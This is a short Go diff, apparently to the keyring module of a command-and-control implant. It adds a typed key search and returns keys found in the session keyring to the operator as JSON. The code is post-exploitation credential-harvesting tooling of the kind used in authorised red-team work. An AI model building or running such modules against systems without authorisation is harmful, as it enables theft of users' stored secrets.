@@ -7,8 +7,9 @@ import (
 )
 
 type Options struct {
-	Command string `json:"command"`
-	Keyword string `json:"keyword"`
+	Command  string `json:"command"`
+	Keyword  string `json:"keyword"`
+	Typename string `json:"typename"`
 }
 
 type Keyresults struct {
@@ -79,6 +80,29 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 		break
 	case "search":
 		key, err := Searchcurrentsessionkeyring(opts.Keyword)
+		if err != nil {
+			tMsg.Error = true
+			tMsg.TaskResult = []byte(err.Error())
+			threadChannel <- tMsg
+			return
+		}
+
+		r := Keyresults{}
+		r.Results = key
+
+		jsonKeys, err := json.MarshalIndent(r, "", "	")
+		if err != nil {
+			tMsg.Error = true
+			tMsg.TaskResult = []byte(err.Error())
+			threadChannel <- tMsg
+			return
+		}
+
+		tMsg.TaskResult = jsonKeys
+		threadChannel <- tMsg
+		break
+	case "searchwithtype":
+		key, err := Searchforkeywithtype(opts.Keyword, opts.Typename)
 		if err != nil {
 			tMsg.Error = true
 			tMsg.TaskResult = []byte(err.Error())
